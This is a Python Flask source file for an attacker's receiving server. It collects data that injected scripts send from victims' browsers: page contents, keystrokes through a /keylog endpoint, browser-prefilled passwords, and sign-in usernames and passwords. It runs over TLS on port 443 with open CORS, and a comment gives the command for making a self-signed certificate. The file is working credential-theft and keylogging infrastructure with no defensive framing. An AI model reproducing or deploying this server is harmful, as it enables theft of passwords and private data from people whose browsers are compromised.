from flask import Flask, request, send_file, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_url_path='')
CORS(app)

@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path, cache_timeout=-1)

@app.route('/x', methods=['POST'])
def report():
    print("[+] Receiving Page Content")
    data = request.get_json()
    url, content = data['url'], data['content']
    # store page content somewhere ex. DB
    return jsonify({"message": "OK"})

@app.route('/keylog', methods=['POST'])
def keylogger():
    data = request.get_json()
    name, val = data['tagname'], data['tagval']
    print(name, val)
    return ""

@app.route('/prefill', methods=['POST'])
def preFilledPassword():
    data = request.get_json()
    name, _pass = data['name'], data['value']
    print(name, _pass)
    return ""

@app.route('/signin', methods=['POST'])
def signin():
    data = request.get_json()
    name, _pass = data['username'], data['password']
    print(name, _pass)
    return ""

# openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))